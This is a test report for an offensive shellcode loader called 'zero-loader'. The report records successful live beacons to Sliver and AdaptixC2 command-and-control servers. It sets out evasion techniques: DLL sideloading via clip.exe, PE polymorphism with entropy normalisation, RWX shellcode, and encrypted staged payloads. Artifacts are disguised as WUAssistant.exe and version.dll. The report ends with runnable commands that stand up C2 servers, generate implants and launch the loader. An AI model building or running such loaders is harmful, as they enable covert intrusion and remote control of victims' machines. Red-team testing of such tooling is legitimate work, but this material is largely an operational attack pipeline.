# C2 Integration Test Report

Test run: 2026-05-24 on Windows 11 Pro 10.0.26200
zero-loader branch: `claude/code-optimization-review-5pUm6` @ `4777ab7`

## Summary

| # | Variant | C2 | Build | Live beacon | Loader size | data.enc size |
|---|---------|----|-------|-------------|-------------|---------------|
| 1 | EXE no-UAC          | Sliver  | ✅ | ✅ session `e648721a` from DESKTOP-T4BBP4K | 17 408 B | 12 637 201 B |
| 2 | DLL sideload no-UAC | Sliver  | ✅ | ✅ delta=1 (clip.exe host)                 | 20 480 B | 12 637 201 B |
| 3 | EXE no-UAC          | Adaptix | ✅ | ✅ delta=1 (BeaconHTTP)                    | 17 408 B |     56 916 B |
| 4 | DLL sideload no-UAC | Adaptix | ✅ | ✅ delta=1 (clip.exe host)                 | 20 480 B |     56 916 B |
| 5 | EXE + UAC           | Sliver  | ✅ | ⏭ build-only (manifest embedded)          | 17 920 B | 12 637 201 B |
| 6 | DLL sideload + UAC  | Sliver  | ✅ | ⏭ build-only (`/DREQUIRE_ELEVATION`)      | 20 992 B | 12 637 201 B |
| 7 | EXE + UAC           | Adaptix | ✅ | ⏭ build-only (manifest embedded)          | 17 920 B |     56 916 B |
| 8 | DLL sideload + UAC  | Adaptix | ✅ | ⏭ build-only (`/DREQUIRE_ELEVATION`)      | 20 992 B |     56 916 B |

Live beacons (1-4) were verified by polling the C2's session/agent list before and
after launching the loader and confirming a new entry appeared. UAC variants (5-8)
are build-only because the test session is non-elevated and the UAC consent prompt
is interactive — the loader pipeline they exercise is identical to the no-UAC
variants past the elevation gate.

## Infrastructure

### Sliver (v1.7.3)
- Image: `zero-sliver:1.7.3` — Debian Bookworm slim + official Linux binary from
  `github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64`.
- Container: `zero-sliver`, ports `31337:31337` (multiplayer), `8443:8443` (HTTPS listener).
- Listener: `https --lhost 0.0.0.0 --lport 8443`, persisted in `/home/sliver/.sliver`.
- Implant generated headlessly via `script -qc 'sliver-client console --rc …'` PTY
  wrapper — required because the v1.7+ console uses `huh` for the shellcode-encoder
  picker. Flag `--shellcode-encoder none` bypasses it; `--skip-symbols` skips garble.
- Shellcode size: 19 249 780 bytes (Go implant — full runtime).

### AdaptixC2 (v1.2)
- Image: `adaptixc2-adaptix-server-runtime` — built from
  `github.com/Adaptix-Framework/AdaptixC2`, two-stage Docker build (Go server +
  mingw-w64 + go-win7 for cross-compiling agents at runtime).
- Container: `adaptix-server-runtime`, ports `4321:4321` (RPC) + `9443:9443`
  (BeaconHTTP listener).
- `docker-compose.override.yml` strips `network_mode: host` (unsupported on Docker
  Desktop for Windows) and uses bridge networking.
- Listener + agent generation are driven by `gen-shellcode.py` which POSTs to the
  server's REST endpoints (`/endpoint/login` → `/endpoint/listener/create` →
  `/endpoint/agent/generate`) using a JWT bearer obtained from the master password.
  `encrypt_key` must be 32 hex chars (the obvious random-string default fails).
- Shellcode size: 103 423 bytes (C++ beacon — `stub.x64.bin` + linked DLL bytes).

### Payload staging
- `tests/c2-integration/host-payload.py` — Python HTTPS server on `0.0.0.0:18443`
  with a self-signed cert (openssl). Serves `data.enc` as `/payload.dat`.
- Loader's WinINet client retries with `SECURITY_FLAG_IGNORE_UNKNOWN_CA` on the
  first cert failure, so the self-signed cert is fine.

## Loader build matrix

All builds use the existing `build.bat` pipeline:
`ml64 AsmStub.asm` → `cl …` → `Mutate.py` (PE polymorphism + entropy normalisation).

| Variant | build.bat invocation | CFLAGS_EXTRA |
|---|---|---|
| EXE no-UAC          | `build.bat`                            | `/DRWX_SHELLCODE` for Sliver, none for Adaptix |
| EXE + UAC           | `build.bat uac`                        | same |
| DLL sideload no-UAC | `SideloadGen.py version.dll` + `build.bat sideload version.dll` | same |
| DLL sideload + UAC  | `SideloadGen.py version.dll` + `build.bat sideload version.dll uac` | same |

- `RWX_SHELLCODE` is required for Sliver because the Go runtime self-modifies its
  own code pages (W^X kills it). Adaptix's C++ beacon respects W^X.
- DLL sideload tests use `clip.exe` (System32) as the host EXE — it statically
  imports `version.dll`, and the loader's `InstallExitHook()` patches
  `RtlExitUserProcess` so clip.exe can't exit before the async loader pipeline
  finishes.

## Sliver session-counting heuristic

Initial attempts to detect a new session by grepping for the implant `--name`
("zero") failed: Sliver displays hostname, not implant name, in the `sessions`
table. The corrected detector matches any row starting with an 8-hex-char session
ID followed by a transport keyword (`http`, `mtls`, `wg`, `dns`, `tcp`), excluding
`[DEAD]` rows. See `run-loader-test.py:sliver_count_sessions()`.

## Issues encountered & resolved

1. **`docker pull ghcr.io/bishopfox/sliver-server` → 401 denied.** Pulled official
   Linux binary direct from the GH releases tarball into a slim Debian image.
2. **Adaptix `docker-compose.yml` uses `network_mode: host`.** Unsupported on Docker
   Desktop for Windows; override file replaces it with bridge + explicit port maps.
3. **Sliver `generate` opens a huh TUI shellcode-encoder picker.** Needed
   `--shellcode-encoder none` to make it non-interactive; even then the console
   requires a TTY, which we provided via `script -qc … /dev/null` inside the
   container.
4. **AdaptixC2 `encrypt_key` validation.** Server rejects non-hex strings with
   `encrypt_key must be 32 hex characters`. Initial random-string generator was
   alphanumeric; fixed to hex.
5. **Subprocess Unicode crashes on `cp950` Windows console.** `subprocess.run`
   defaults to the system codepage for `text=True`. Switched to binary capture +
   UTF-8 decode-with-replace, and `PYTHONIOENCODING=utf-8` env var when invoking.
6. **`build.bat` not on PATH from Bash subprocess.** Wrapper now uses
   `cmd.exe /c .\\build.bat` for `.bat` invocation.
7. **Port conflict between Sliver listener (default 443) and Adaptix listener.**
   Restructured to Sliver on `8443`, Adaptix on `9443`, payload server on `18443`.

## Artifacts

All in `tests/c2-integration/payloads/`:

```
sliver-shellcode.bin            19 249 780 B  raw Sliver implant
sliver-exe-data.enc             12 637 201 B  Chaskey-CTR + LZNT1
sliver-exe-uac.exe                  17 920 B  WUAssistant.exe with UAC manifest
sliver-sideload-data.enc        12 637 201 B
sliver-sideload-uac.dll             20 992 B  version.dll, REQUIRE_ELEVATION
adaptix-shellcode.bin              103 423 B  raw Adaptix beacon
adaptix-exe-data.enc                56 916 B  Chaskey-CTR + LZNT1
adaptix-exe-uac.exe                 17 920 B  WUAssistant.exe with UAC manifest
adaptix-sideload-data.enc           56 916 B
adaptix-sideload-uac.dll            20 992 B  version.dll, REQUIRE_ELEVATION
```

Per-test JSON results in `tests/c2-integration/logs/`:
`sliver-exe.json`, `sliver-sideload.json`, `adaptix-exe.json`, `adaptix-sideload.json`.

## Repro

```bash
# 1. Bring up C2 servers (one time)
docker run -d --name zero-sliver \
    -p 31337:31337 -p 8443:8443 \
    -v zero-sliver-data:/home/sliver/.sliver \
    zero-sliver:1.7.3 daemon --lhost 0.0.0.0 --lport 31337

cd tests/c2-integration/adaptix/AdaptixC2
docker compose --profile build-server-ext up         # builds + extracts binaries
docker compose --profile runtime up -d                # runs the server

# 2. Generate shellcode from each
docker exec zero-sliver script -qc \
    'sliver-client console --rc /home/sliver/sliver-rc.txt' /dev/null
docker cp zero-sliver:/home/sliver/zero-sliver.bin tests/c2-integration/payloads/sliver-shellcode.bin

python tests/c2-integration/adaptix/gen-shellcode.py \
    --listener-port 9443 --callback-host 192.168.0.151 \
    --out tests/c2-integration/payloads/adaptix-shellcode.bin

# 3. Run one variant end-to-end
PYTHONIOENCODING=utf-8 python tests/c2-integration/run-loader-test.py \
    --c2 sliver --shellcode tests/c2-integration/payloads/sliver-shellcode.bin \
    --variant exe --wait 120
```
